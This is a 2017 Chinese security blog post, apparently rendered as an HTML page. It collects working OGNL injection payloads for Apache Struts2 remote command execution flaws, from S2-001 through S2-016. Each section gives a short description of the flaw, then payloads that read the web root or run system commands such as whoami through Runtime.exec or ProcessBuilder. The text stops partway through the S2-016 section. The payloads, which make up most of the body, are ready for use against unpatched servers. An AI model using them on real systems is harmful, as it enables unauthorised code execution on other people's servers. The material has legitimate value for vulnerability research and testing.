@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="概述最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【VULNERABLITY】Struts2命令执行各版本记录">
+<meta property="og:url" content="http://blog.0kami.cn/2017/01/13/Struts2-history-payload/index.html">
+<meta property="og:site_name" content="0kami's Blog">
+<meta property="og:description" content="概述最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏">
+<meta property="og:updated_time" content="2018-01-25T07:32:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【VULNERABLITY】Struts2命令执行各版本记录">
+<meta name="twitter:description" content="概述最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>【VULNERABLITY】Struts2命令执行各版本记录</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/01/29/DM-sql-injection/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/01/11/bluecms-v1-6-Sql-Injection/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&text=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&is_video=false&description=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【VULNERABLITY】Struts2命令执行各版本记录&body=Check out this article: http://blog.0kami.cn/2017/01/13/Struts2-history-payload/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&title=【VULNERABLITY】Struts2命令执行各版本记录"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2017/01/13/Struts2-history-payload/&name=【VULNERABLITY】Struts2命令执行各版本记录&description=&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏&lt;/p&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Struts2命令执行集合"><span class="toc-number">2.</span> <span class="toc-text">Struts2命令执行集合</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-001"><span class="toc-number">2.1.</span> <span class="toc-text">Struts2 S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC"><span class="toc-number">2.1.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取tomcat执行路径"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">获取tomcat执行路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令"><span class="toc-number">2.1.1.3.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-005"><span class="toc-number">2.2.</span> <span class="toc-text">Struts2 S2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-1"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-1"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-009"><span class="toc-number">2.3.</span> <span class="toc-text">Struts2 S2-009</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#弹计算器"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">弹计算器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-2"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">获取web根目录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-012"><span class="toc-number">2.4.</span> <span class="toc-text">Struts2 S2-012</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根路径"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">获取web根路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-2"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-013-S2-014"><span class="toc-number">2.5.</span> <span class="toc-text">Struts2 S2-013/S2-014</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-4"><span class="toc-number">2.5.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-3"><span class="toc-number">2.5.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-3"><span class="toc-number">2.5.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-016"><span class="toc-number">2.6.</span> <span class="toc-text">Struts2 S2-016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-5"><span class="toc-number">2.6.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-4"><span class="toc-number">2.6.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-4"><span class="toc-number">2.6.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-019"><span class="toc-number">2.7.</span> <span class="toc-text">Struts2 S2-019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-6"><span class="toc-number">2.7.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根路径-1"><span class="toc-number">2.7.1.1.</span> <span class="toc-text">获取web根路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-5"><span class="toc-number">2.7.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-032"><span class="toc-number">2.8.</span> <span class="toc-text">Struts2 S2-032</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-7"><span class="toc-number">2.8.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-5"><span class="toc-number">2.8.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-6"><span class="toc-number">2.8.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-S2-037"><span class="toc-number">2.9.</span> <span class="toc-text">Struts2 S2-037</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#构造PoC-8"><span class="toc-number">2.9.1.</span> <span class="toc-text">构造PoC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#获取web根目录-6"><span class="toc-number">2.9.1.1.</span> <span class="toc-text">获取web根目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行系统命令-7"><span class="toc-number">2.9.1.2.</span> <span class="toc-text">执行系统命令</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【VULNERABLITY】Struts2命令执行各版本记录
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">0kami's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-01-13T08:57:47.000Z" itemprop="datePublished">2017-01-13</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/vul/">vul</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>最近在写Struts2的一些PoC，记录一下各个版本的PoC方便到时候查阅。先提一下参考的前辈们的网址，感谢🙏</p>
+<a id="more"></a>
+<ul>
+<li><a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="external">http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</a></li>
+<li><a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="external">http://www.cnblogs.com/LittleHann/p/4606891.html</a></li>
+<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-xxx" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-xxx</a></li>
+<li><a href="http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" target="_blank" rel="external">http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></li>
+<li><a href="https://cwiki.apache.org/confluence/display/WW/S2-009" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-009</a></li>
+</ul>
+<h1 id="Struts2命令执行集合"><a href="#Struts2命令执行集合" class="headerlink" title="Struts2命令执行集合"></a>Struts2命令执行集合</h1><p>下文不是具体的分析文，能力有限，仅记录一下以做将来复习查用。<br>过段时间会将所有的漏洞环境上传到github上，环境来源大部分为我偶像<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="external">rickgray</a>博客上共享的以及官网上下的对应版本的示例环境。<br>update:2017/1/16 <a href="https://github.com/0kami/Struts2Environment/" target="_blank" rel="external">环境地址</a></p>
+<h2 id="Struts2-S2-001"><a href="#Struts2-S2-001" class="headerlink" title="Struts2 S2-001"></a>Struts2 S2-001</h2><pre><code>影响版本：2.0.0 - 2.0.8
+具体详情：https://struts.apache.org/docs/s2-001.html
+</code></pre><blockquote>
+<p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+</blockquote>
+<p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="external">rickgray</a>的描述。</p>
+<h3 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取tomcat执行路径"><a href="#获取tomcat执行路径" class="headerlink" title="获取tomcat执行路径"></a>获取tomcat执行路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</div></pre></td></tr></table></figure>
+<h4 id="获取web根目录"><a href="#获取web根目录" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</div></pre></td></tr></table></figure>
+<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-005"><a href="#Struts2-S2-005" class="headerlink" title="Struts2 S2-005"></a>Struts2 S2-005</h2><pre><code>影响版本: 2.0.0 - 2.1.8.1
+漏洞详情: http://struts.apache.org/docs/s2-005.html
+</code></pre><blockquote>
+<p>struts2漏洞的起源源于S2-003(受影响版本: 低于Struts 2.0.12)，struts2会将http的每个参数名解析为ongl语句执行(可理解为java代码)。ongl表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式讲这2个选项打开，S2-003的修补方案把自己上了一个锁，但是把锁钥匙给插在了锁头上</p>
+</blockquote>
+<p>上文引用<a href="http://www.cnblogs.com/LittleHann/p/4606891.html" target="_blank" rel="external">LittleHann</a>的描述</p>
+<h3 id="构造PoC-1"><a href="#构造PoC-1" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-1"><a href="#获取web根目录-1" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43req\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\43xman\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\43xman.getWriter().println(\43req.getRealPath(%22\u005c%22))&apos;)(d))&amp;(i99)((&apos;\43xman.getWriter().close()&apos;)(d))</div></pre></td></tr></table></figure>
+<h4 id="执行系统命令-1"><a href="#执行系统命令-1" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;&quot;+cmd+&quot;\&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d))</div></pre></td></tr></table></figure>
+<p>上面2个PoC摘自k8team，为了写PoC，有所改动，但是这里就不贴上来了：）</p>
+<h2 id="Struts2-S2-009"><a href="#Struts2-S2-009" class="headerlink" title="Struts2 S2-009"></a>Struts2 S2-009</h2><pre><code>影响版本: 2.0.0 - 2.3.1.1
+漏洞详情: https://struts.apache.org/docs/s2-009.html
+</code></pre><p>漏洞利用点跟S2-003和S2-005类似，利用OGNL表达式(1)(2),会执行1的OGNL表达式，009构造了的方法为test=(some OGNL 表达式)(1)&amp;z[(test)(1)]=true。<br>z[(test)(1)]=true,对struts2来说是合法的参数，但是(test)(1)会执行上述说的方法，test的值被带入计算，造成命令执行。</p>
+<h3 id="构造PoC-2"><a href="#构造PoC-2" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="弹计算器"><a href="#弹计算器" class="headerlink" title="弹计算器"></a>弹计算器</h4><p>ps:实验环境试了好几次都不能执行系统命令，路过的大佬求指教：）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true</div></pre></td></tr></table></figure>
+<p>用的是<code>person/new-person.action</code>这个控制器</p>
+<h4 id="获取web根目录-2"><a href="#获取web根目录-2" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot;</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-012"><a href="#Struts2-S2-012" class="headerlink" title="Struts2 S2-012"></a>Struts2 S2-012</h2><pre><code>影响版本: 2.0.0 - 2.3.13
+漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-012
+</code></pre><p>Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量,struts在获取其值时会执行OGNL表达式，从而造成命令执行</p>
+<h3 id="构造PoC-3"><a href="#构造PoC-3" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根路径"><a href="#获取web根路径" class="headerlink" title="获取web根路径"></a>获取web根路径</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D</div></pre></td></tr></table></figure>
+<h4 id="执行系统命令-2"><a href="#执行系统命令-2" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-013-S2-014"><a href="#Struts2-S2-013-S2-014" class="headerlink" title="Struts2 S2-013/S2-014"></a>Struts2 S2-013/S2-014</h2><pre><code>影响版本: 2.0.0 - 2.3.14.1
+漏洞详情: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014
+</code></pre><p>标签<code>s:url</code>和<code>s:a</code>中提供include参数，其参数值可以为</p>
+<ol>
+<li>none - include no parameters in the URL (default)</li>
+<li>get - include only GET parameters in the URL</li>
+<li>all - include both GET and POST parameters in the URL</li>
+</ol>
+<p>如果参数值为get或all，在获取对应的参数值时执行了OGNL表达式</p>
+<h3 id="构造PoC-4"><a href="#构造PoC-4" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-3"><a href="#获取web根目录-3" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125;</div></pre></td></tr></table></figure>
+<h4 id="执行系统命令-3"><a href="#执行系统命令-3" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125;</div></pre></td></tr></table></figure>
+<h2 id="Struts2-S2-016"><a href="#Struts2-S2-016" class="headerlink" title="Struts2 S2-016"></a>Struts2 S2-016</h2><pre><code>影响版本: 2.0.0 - 2.3.15
+漏洞详情: https://struts.apache.org/docs/s2-016.html
+</code></pre><blockquote>
+<p>DefaultActionMapper 类支持以 action:，redirect: 和 redirectAction: 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行</p>
+</blockquote>
+<p>上文引用<a href="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="external">rickgray</a>的描述。</p>
+<h3 id="构造PoC-5"><a href="#构造PoC-5" class="headerlink" title="构造PoC"></a>构造PoC</h3><h4 id="获取web根目录-4"><a href="#获取web根目录-4" class="headerlink" title="获取web根目录"></a>获取web根目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125;</div></pre></td></tr></table></figure>
